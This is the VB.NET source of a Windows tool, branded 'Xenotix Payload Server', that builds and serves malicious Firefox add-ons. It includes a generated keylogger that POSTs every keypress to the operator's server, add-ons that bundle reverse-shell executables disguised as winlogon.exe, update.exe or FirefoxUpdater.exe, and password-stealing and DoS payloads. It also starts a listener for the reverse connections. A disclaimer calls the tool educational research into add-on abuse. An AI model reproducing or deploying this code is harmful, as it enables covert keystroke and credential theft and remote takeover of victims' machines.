Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Text
Imports System.Threading
Imports Ionic.Zip

Public Class Form1
    Public keylog As Boolean = False
    Public paswd As Boolean = False
    Public ipport As String

    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try
            exits()
            System.IO.File.Delete("HTML.xpi")
            System.IO.File.Delete("HTML5v1.xpi")
            System.IO.File.Delete("HTML5v2.xpi")
            System.IO.File.Delete("HTML5v3.xpi")
            System.IO.File.Delete("HTML5v4.xpi")
            System.IO.File.Delete("HTML5v5.xpi")


        Catch
        End Try
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        Shell("taskkill /F /IM QuickPHP.exe")
    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim jnk As Integer
        If ip.Text = "" Or Not Int32.TryParse(port.Text, jnk) Or port.Text = "" Or jnk < 1 Or jnk > 65355 Then
            MsgBox("Enter a valid IP Address and Port Number", vbCritical)

        ElseIf port.Equals("9999") Then
            MsgBox("Port Reserved!!", vbCritical)
        Else
            If port.Text.Equals("80") Then
                ipport = ip.Text
            Else
                ipport = ip.Text + ":" + port.Text
            End If

            Dim cmp, q As String
            q = """"
            cmp = " /Bind=" & q & "0.0.0.0" & q & " /Port=" & port.Text & " /Root=" & q & "./" & q & " /Start /Minimized"
            Try
                Process.Start("QuickPHP.exe", cmp)
                startserver()
                Button1.Enabled = False
                '  MsgBox("Server Started")
            Catch ee As Exception

                MsgBox(ee.Message.ToString(), vbCritical)
            End Try
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        MsgBox("Stopping Server!", vbInformation)
        exits()
        Shell("taskkill /F /IM QuickPHP.exe")
        MsgBox("Server Stopped")
        Button1.Enabled = True
        Me.Close()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try

            Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\HTML5v3.xpz")
                Dim ee As ZipEntry
                For Each ee In unzip
                    ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
                Next

            End Using
            Dim stream As New IO.StreamWriter(Application.StartupPath & "\overlay.js")
            stream.WriteLine("document.onkeypress = function(evt) { evt = evt || window.event ")
            stream.WriteLine("if(evt.charCode===32) { key=' '; } else if(evt.charCode===8) { key='[BACKSPACE]'; } else if(evt.charCode===9) { key='[TAB]'; } else { key = String.fromCharCode(evt.charCode);}")
            stream.WriteLine("if (key) { ")
            stream.WriteLine("var http;  if (window.XMLHttpRequest){http=new XMLHttpRequest();} var param = encodeURI(key)")
            stream.WriteLine("http.open('POST','http://" & ipport & "/klog.php',true);")
            stream.WriteLine("http.setRequestHeader('Content-type','application/x-www-form-urlencoded'); http.send('key='+param);}}")
            stream.Close()
            Using zip As ZipFile = New ZipFile
                zip.AddFile(Application.StartupPath & "\overlay.js", "")
                zip.AddFile(Application.StartupPath & "\chrome.manifest", "")
                zip.AddFile(Application.StartupPath & "\install.rdf", "")
                zip.AddFile(Application.StartupPath & "\overlay.xul", "")
                zip.Save("HTML5v3.xpi")
            End Using
            IO.File.Delete("overlay.js")
            IO.File.Delete("chrome.manifest")
            IO.File.Delete("install.rdf")
            IO.File.Delete("overlay.xul")


            keyloggerurl.Text = "http://" & ip.Text & ":9999/HTML5v3.xpi"
            keylog = True
            paswd = False
            Timer1.Enabled = True
        Catch ex As Exception

        End Try


    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If keylog = True Then

                Dim line As String = System.IO.File.ReadAllText(Application.StartupPath & "\logs.txt", Encoding.UTF8)
                keylogger.Text = line
            End If
            If paswd = True Then
                Dim line As String = System.IO.File.ReadAllText(Application.StartupPath & "\paswd.txt", Encoding.UTF8)
                TextBox8.Text = line
            End If

        Catch

        End Try
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs)

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        keylog = False
        Timer1.Enabled = False
    End Sub

    'HTTP SERVER 
    '#Region "Server Functions"
    Private myListener As TcpListener
    Shared sDocRoot As String
    Shared sport As Integer

    Dim th As New Thread(New ThreadStart(AddressOf StartListen))
    'The constructor which make the TcpListener start listening on the given port.
    'It also calls a Thread on the method StartListen(). 
    Public Sub startserver()
        Try
            sDocRoot = Application.StartupPath
            sport = 9999
            'start listing on the given port
            myListener = New TcpListener(IPAddress.Any, sport)
            myListener.Start()
            'start the thread which calls the method 'StartListen'

            th.Start()
        Catch e As System.Net.Sockets.SocketException
            If e.Message = "Only one usage of each socket address (protocol/network address/port) is normally permitted" Then
                MsgBox("Port already Binded", vbCritical)
            End If
        Catch e As Exception
            MsgBox(e.Message.ToString, vbCritical)

        End Try

    End Sub
    Public Sub exits()

        myListener.Stop()
        th.Abort()


    End Sub


    'This method Accepts the new connection.
    'First it receives the welcome message from the client,
    'Then it sends the Current date time to the Client.
    Public Sub StartListen()
        Try
            Dim iStartPos As Integer = 0
            Dim sRequest As String = ""
            Dim sDirName As String = ""
            Dim sRequestedFile As String = ""
            Dim sErrorMessage As String = ""
            Dim sFolderName As String = ""
            Dim sLocalDir As String = ""
            Dim sPhysicalFilePath As String = ""
            Dim sFormattedMessage As String = ""
            Dim sResponse As String = ""

            While True
                'Accept a new connection
                Dim mySocket As Socket = myListener.AcceptSocket()
                If mySocket.Connected Then
                    'make a byte array and receive data from the client 
                    Dim bReceive As Byte() = New Byte(1023) {}
                    Dim i As Integer = mySocket.Receive(bReceive, bReceive.Length, 0)

                    'Convert Byte to String
                    Dim sBuffer As String = Encoding.ASCII.GetString(bReceive)
                    If sBuffer = "" Then
                        mySocket.Close()
                        Exit Sub
                    End If
                    'At present we will only deal with GET type

                    ' Look for HTTP request
                    iStartPos = sBuffer.IndexOf("HTTP", 1)

                    ' Get the HTTP text and version e.g. it will return "HTTP/1.1"
                    Dim sHttpVersion As String = sBuffer.Substring(iStartPos, 8)

                    ' Extract the Requested Type and Requested file/directory
                    sRequest = sBuffer.Substring(0, iStartPos - 1)

                    'Replace backslash with Forward Slash, if Any
                    sRequest.Replace("\", "/")

                    'If file name is not supplied add forward slash to indicate 
                    'that it is a directory and then we will look for the 
                    'default file name..
                    If (sRequest.IndexOf(".") < 1) AndAlso (Not sRequest.EndsWith("/")) Then
                        sRequest = sRequest & "/"
                    End If

                    'Extract the requested file name
                    iStartPos = sRequest.LastIndexOf("/") + 1
                    sRequestedFile = sRequest.Substring(iStartPos)

                    'Extract The directory Name
                    sDirName = sRequest.Substring(sRequest.IndexOf("/"), sRequest.LastIndexOf("/") - 3)
                    If sDirName = "" Then
                        ' Identify the Physical Directory
                        sLocalDir = sDocRoot
                    Else
                        Dim temp As String = sDirName.Replace("/", "\")
                        sLocalDir = Application.StartupPath & temp

                    End If
                    'If the physical directory does not exist then dispaly the error message
                    If Not Directory.Exists(sLocalDir) Then
                        sErrorMessage = "<H2>Error!! Requested Directory does not exist!</H2><Br>"
                        'Format The Message
                        SendHeader(sHttpVersion, "", sErrorMessage.Length, " 404 Not Found", mySocket)

                        'Send to the browser
                        SendToBrowser(sErrorMessage, mySocket)

                        mySocket.Close()
                        Continue While
                    End If


                    ' Identify the File Name


                    'If The file name is not supplied then look in the default file list
                    If sRequestedFile.Length = 0 Then
                        ' Get the default filename
                        If sRequestedFile = "" Then
                            sErrorMessage = "<H2>Xenotix Payload Server: 404 File Not Found</H2>"
                            SendHeader(sHttpVersion, "", sErrorMessage.Length, " 404 Not Found", mySocket)
                            SendToBrowser(sErrorMessage, mySocket)
                            mySocket.Close()
                            Continue While
                        End If
                    End If
                    ' Get TheMime Type
                    Dim sMimeType As String = getContentType(sRequestedFile)
                    'Build the physical path
                    sPhysicalFilePath = sLocalDir & "\" & sRequestedFile
                    If File.Exists(sPhysicalFilePath) = False Then

                        sErrorMessage = "<H2>Xenotix Payload Server: 404 File Not Found</H2>"
                        SendHeader(sHttpVersion, "", sErrorMessage.Length, " 404 Not Found", mySocket)
                        SendToBrowser(sErrorMessage, mySocket)
                    Else
                        Dim iTotBytes As Integer = 0
                        sResponse = ""

                        Dim fs As New FileStream(sPhysicalFilePath, FileMode.Open, FileAccess.Read, FileShare.Read)
                        ' Create a reader that can read bytes from the FileStream.
                        Dim reader As New BinaryReader(fs)
                        Dim bytes As Byte() = New Byte(fs.Length - 1) {}
                        Dim read As Integer
                        While (InlineAssignHelper(read, reader.Read(bytes, 0, bytes.Length))) <> 0
                            ' Read from the file and write the data to the network
                            sResponse = sResponse & Encoding.ASCII.GetString(bytes, 0, read)
                            iTotBytes = iTotBytes + read
                        End While
                        reader.Close()

                        SendHeader(sHttpVersion, sMimeType, iTotBytes, " 200 OK", mySocket)
                        SendToBrowser(bytes, mySocket)
                    End If
                    mySocket.Close()

                End If
            End While
        Catch e As Exception

        End Try
    End Sub

    'GETS

    Private Function getContentType(ByVal httpRequest As String) As String
        If (httpRequest.EndsWith(".html")) Then
            Return "text/html"
        ElseIf (httpRequest.EndsWith(".png")) Then
            Return "image/png"
        ElseIf (httpRequest.EndsWith(".htm")) Then
            Return "text/html"
        ElseIf (httpRequest.EndsWith(".txt")) Then
            Return "text/plain"
        ElseIf (httpRequest.EndsWith(".gif")) Then
            Return "image/gif"
        ElseIf (httpRequest.EndsWith(".jpg")) Then
            Return "image/jpeg"
        ElseIf (httpRequest.EndsWith(".jpeg")) Then
            Return "image/jpeg"
        ElseIf (httpRequest.EndsWith(".swf")) Then
            Return "application/x-shockwave-flash"
            ' ADD BMP,js,xml
        ElseIf (httpRequest.EndsWith(".bmp")) Then
            Return "image/bmp"
        ElseIf (httpRequest.EndsWith(".js")) Then
            Return "application/javascript"
        ElseIf (httpRequest.EndsWith(".xml")) Then
            Return "application/xml"
        ElseIf (httpRequest.EndsWith(".xpi")) Then
            Return "application/x-xpinstall"
        Else
            Return "application/octect"
        End If
    End Function

    'SENDS


    Public Sub SendHeader(ByVal sHttpVersion As String, ByVal sMIMEHeader As String, ByVal iTotBytes As Integer, ByVal sStatusCode As String, ByRef mySocket As Socket)

        Dim sBuffer As String = ""

        ' if Mime type is not provided set default to text/html
        If sMIMEHeader.Length = 0 Then
            ' Default Mime Type is text/html
            sMIMEHeader = "text/html"
        End If

        sBuffer = sBuffer & sHttpVersion & sStatusCode & vbCr & vbLf
        sBuffer = sBuffer & "Server: Xenotix Payload Server" & vbCr & vbLf
        sBuffer = sBuffer & "Content-Type: " & sMIMEHeader & vbCr & vbLf
        sBuffer = sBuffer & "Accept-Ranges: bytes" & vbCr & vbLf
        sBuffer = sBuffer & "Content-Length: " & iTotBytes & vbCr & vbLf & vbCr & vbLf

        Dim bSendData As Byte() = Encoding.ASCII.GetBytes(sBuffer)

        SendToBrowser(bSendData, mySocket)

    End Sub

    Public Sub SendToBrowser(ByVal sData As String, ByRef mySocket As Socket)
        SendToBrowser(Encoding.ASCII.GetBytes(sData), mySocket)
    End Sub

    Public Sub SendToBrowser(ByVal bSendData As Byte(), ByRef mySocket As Socket)
        Dim numBytes As Integer = 0

        Try
            If mySocket.Connected Then
                If (InlineAssignHelper(numBytes, mySocket.Send(bSendData, bSendData.Length, 0))) = -1 Then
                End If
            Else

            End If
        Catch e As Exception
            MsgBox(e.Message.ToString)

        End Try
    End Sub

    Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
        target = value
        Return value
    End Function
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        keylogger.Text = ""
        System.IO.File.Delete(Application.StartupPath & "\logs.txt")
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        On Error Resume Next
        Dim jnk As Integer = Int32.TryParse(TextBox2.Text, jnk)
        If Not Int32.TryParse(TextBox2.Text, jnk) Or TextBox2.Text = "" Or jnk < 1 Or jnk > 65355 Or TextBox1.Text = "" Then
            MsgBox("Enter a valid Reverse IP and Port Number", vbCritical)

        ElseIf jnk = 9999 Then
            MsgBox("Reserved Port", vbCritical)

        Else
            On Error Resume Next
            Dim cmp As String
            cmp = " " & TextBox2.Text
            Process.Start("listener.exe", cmp)
            TextBox3.AppendText(vbCrLf + "Listener Started on " + TextBox1.Text + ":" + TextBox2.Text)

        End If

    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Dim jnk As Integer
        If TextBox1.Text = "" Or TextBox2.Text = "" Or Not (Int32.TryParse(TextBox2.Text, jnk)) Or jnk < 1 Or jnk > 65355 Then
            MsgBox("Enter a valid IP and Port", vbCritical)
        End If
        If TextBox1.Text.StartsWith("http") Then
            MsgBox("Provide a valid IP Address. (ex: 192.168.1.2)", vbInformation)
        End If
        If Not TextBox1.Text.Contains(".") Then
            MsgBox("Invalid IP Address", vbCritical)
        Else
            Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\HTML.xpz")
                Dim ee As ZipEntry
                For Each ee In unzip
                    ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
                Next

            End Using
            Dim stream As New IO.StreamWriter(Application.StartupPath & "\settings.dat")
            stream.WriteLine(TextBox1.Text)
            stream.WriteLine(TextBox2.Text)
            stream.Close()

            Using zip As ZipFile = New ZipFile
                zip.AddFile(Application.StartupPath & "\bootstrap.js", "")
                zip.AddFile(Application.StartupPath & "\chrome.manifest", "")
                zip.AddFile(Application.StartupPath & "\install.rdf", "")
                zip.AddFile(Application.StartupPath & "\overlay.xul", "")
                zip.AddFile(Application.StartupPath & "\settings.dat", "")
                zip.AddFile(Application.StartupPath & "\winlogon.exe", "")
                zip.Save("HTML.xpi")
            End Using
            IO.File.Delete("bootstrap.js")
            IO.File.Delete("chrome.manifest")
            IO.File.Delete("install.rdf")
            IO.File.Delete("overlay.xul")
            IO.File.Delete("winlogon.exe")
            IO.File.Delete("settings.dat")

            TextBox4.Text = "http://" & ip.Text & ":9999/HTML.xpi"

            TextBox3.AppendText(vbCrLf + "Addon Created" + vbCrLf + "Addon URL is generated")

        End If
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click

        If OpenFileDialog1.ShowDialog = DialogResult.OK Then
            Button9.Enabled = True

            TextBox5.Text = OpenFileDialog1.FileName
        Else
            Button9.Enabled = False
            TextBox5.Text = ""
        End If
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        On Error Resume Next
        IO.File.Copy(OpenFileDialog1.FileName, "update.exe")
        Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\HTML5v4.xpz")
            Dim ee As ZipEntry
            For Each ee In unzip
                ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
            Next
        End Using
        Using zip As ZipFile = New ZipFile
            zip.AddFile(Application.StartupPath & "\bootstrap.js", "")
            zip.AddFile(Application.StartupPath & "\chrome.manifest", "")
            zip.AddFile(Application.StartupPath & "\install.rdf", "")
            zip.AddFile(Application.StartupPath & "\overlay.xul", "")
            zip.AddFile(Application.StartupPath & "\update.exe", "")
            zip.Save("HTML5v4.xpi")
        End Using
        IO.File.Delete("bootstrap.js")
        IO.File.Delete("chrome.manifest")
        IO.File.Delete("install.rdf")
        IO.File.Delete("overlay.xul")
        IO.File.Delete("update.exe")

        TextBox6.Text = "http://" & ip.Text & ":9999/HTML5v4.xpi"


    End Sub

    Private Sub OpenFileDialog1_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles OpenFileDialog1.FileOk
        TextBox5.Text = OpenFileDialog1.FileName
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        On Error Resume Next

        Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\HTML5v2.xpz")
            Dim ee As ZipEntry
            For Each ee In unzip
                ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
            Next

        End Using
        Dim stream As New IO.StreamWriter(Application.StartupPath & "\overlay.js")
        stream.WriteLine("var ip = '" & ipport & "';")
        stream.WriteLine(code.Text)
        stream.Close()

        Using zip As ZipFile = New ZipFile
            zip.AddFile(Application.StartupPath & "\overlay.js", "")
            zip.AddFile(Application.StartupPath & "\chrome.manifest", "")
            zip.AddFile(Application.StartupPath & "\install.rdf", "")
            zip.AddFile(Application.StartupPath & "\overlay.xul", "")
            zip.Save("HTML5v2.xpi")
        End Using
        IO.File.Delete("overlay.js")
        IO.File.Delete("chrome.manifest")
        IO.File.Delete("install.rdf")
        IO.File.Delete("overlay.xul")

        TextBox7.Text = "http://" & ip.Text & ":9999/HTML5v2.xpi"
        paswd = True
        keylog = False
        Timer1.Enabled = True
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        On Error Resume Next
        If TextBox9.Text = "" Then
            MsgBox("Enter a valid URL", vbCritical)
        Else

            Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\HTML5v1.xpz")
                Dim ee As ZipEntry
                For Each ee In unzip
                    ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
                Next

            End Using
            Dim x As String = ""
            Dim stream As New IO.StreamWriter(Application.StartupPath & "\overlay.js")
            stream.WriteLine("//<![CDATA[")
            If TextBox9.Text.Contains("http://") Then
                x = TextBox9.Text.Replace("http://", "")
            ElseIf TextBox9.Text.Contains("https://") Then
                x = TextBox9.Text.Replace("https://", "")
            End If

            stream.WriteLine("var target = '" & x & "';")
            stream.WriteLine(dos.Text)
            stream.Close()

            Using zip As ZipFile = New ZipFile
                zip.AddFile(Application.StartupPath & "\overlay.js", "")
                zip.AddFile(Application.StartupPath & "\chrome.manifest", "")
                zip.AddFile(Application.StartupPath & "\install.rdf", "")
                zip.AddFile(Application.StartupPath & "\overlay.xul", "")
                zip.Save("HTML5v1.xpi")
            End Using
            IO.File.Delete("overlay.js")
            IO.File.Delete("chrome.manifest")
            IO.File.Delete("install.rdf")
            IO.File.Delete("overlay.xul")

            TextBox10.Text = "http://" & ip.Text & ":9999/HTML5v1.xpi"


        End If
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        System.IO.File.Delete("paswd.txt")
        TextBox8.Text = ""
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        On Error Resume Next
        Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\HTML5v5.xpz")
            Dim ee As ZipEntry
            For Each ee In unzip
                ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
            Next
        End Using
        Dim wr As New IO.StreamWriter(Application.StartupPath & "\bootstrap.js")

        wr.WriteLine("var arguments= ['" & host.Text & "','" & us.Text & "','" & ps.Text & "'];")
        wr.WriteLine(sess.text)
        wr.Close()
        Using zip As ZipFile = New ZipFile
            zip.AddFile(Application.StartupPath & "\bootstrap.js", "")
            zip.AddFile(Application.StartupPath & "\chrome.manifest", "")
            zip.AddFile(Application.StartupPath & "\install.rdf", "")
            zip.AddFile(Application.StartupPath & "\overlay.xul", "")
            zip.AddFile(Application.StartupPath & "\FirefoxUpdater.exe", "")
            zip.Save("HTML5v5.xpi")
        End Using
        IO.File.Delete("bootstrap.js")
        IO.File.Delete("chrome.manifest")
        IO.File.Delete("install.rdf")
        IO.File.Delete("overlay.xul")
        IO.File.Delete("FirefoxUpdater.exe")

        TextBox11.Text = "http://" & ip.Text & ":9999/HTML5v5.xpi"

    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        MsgBox("This software is created for educational and research purpose only. These set of addons were developed to showcase the abuse of Firefox Addon Security Model. The author of this software cannot be held responsible for any of the miss use with this software." + vbCrLf + vbCrLf + "Ajin Abraham" + vbCrLf + "ajin25@gmail.com" + vbCrLf + "http://opensecurity.in", vbInformation)
    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        On Error Resume Next
        Dim jnk As Integer = Int32.TryParse(TextBox14.Text, jnk)
        If Not Int32.TryParse(TextBox14.Text, jnk) Or TextBox14.Text = "" Or jnk < 1 Or jnk > 65355 Or TextBox15.Text = "" Then
            MsgBox("Enter a valid Reverse IP and Port Number", vbCritical)

        ElseIf jnk = 9999 Then
            MsgBox("Reserved Port", vbCritical)

        Else
            On Error Resume Next
            Dim cmp As String
            cmp = " " & TextBox14.Text
            Process.Start("listener.exe", cmp)
            TextBox13.AppendText(vbCrLf + "Listener Started on " + TextBox15.Text + ":" + TextBox14.Text)

        End If
    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        Dim jnk As Integer
        If TextBox15.Text = "" Or TextBox14.Text = "" Or Not (Int32.TryParse(TextBox14.Text, jnk)) Or jnk < 1 Or jnk > 65355 Then
            MsgBox("Enter a valid IP and Port", vbCritical)
        End If
        If TextBox15.Text.StartsWith("http") Then
            MsgBox("Provide a valid IP Address. (ex: 192.168.1.2)", vbInformation)
        End If
        If Not TextBox15.Text.Contains(".") Then
            MsgBox("Invalid IP Address", vbCritical)
        Else
              Using unzip As ZipFile = ZipFile.Read(Application.StartupPath & "\HTML5v6.xpz")
                Dim ee As ZipEntry
                For Each ee In unzip
                    ee.Extract(Application.StartupPath, ExtractExistingFileAction.OverwriteSilently)
                Next

            End Using
            Dim dat As String = System.IO.File.ReadAllText(Application.StartupPath & "\bootstrap.js")
            dat = dat.Replace("XXXIPXXX", TextBox15.Text).Replace("XXXPORTXXX", TextBox14.Text)
            System.IO.File.WriteAllText(Application.StartupPath & "\bootstrap.js", dat)

            Using zip As ZipFile = New ZipFile
                zip.AddFile(Application.StartupPath & "\bootstrap.js", "")
                zip.AddFile(Application.StartupPath & "\chrome.manifest", "")
                zip.AddFile(Application.StartupPath & "\install.rdf", "")
                zip.AddFile(Application.StartupPath & "\overlay.xul", "")

                zip.Save("HTML5v6.xpi")
            End Using
            IO.File.Delete("bootstrap.js")
            IO.File.Delete("chrome.manifest")
            IO.File.Delete("install.rdf")
            IO.File.Delete("overlay.xul")
            TextBox4.Text = "http://" & ip.Text & ":9999/HTML5v6.xpi"
            TextBox3.AppendText(vbCrLf + "Addon Created" + vbCrLf + "Addon URL is generated")

        End If
    End Sub
End Class
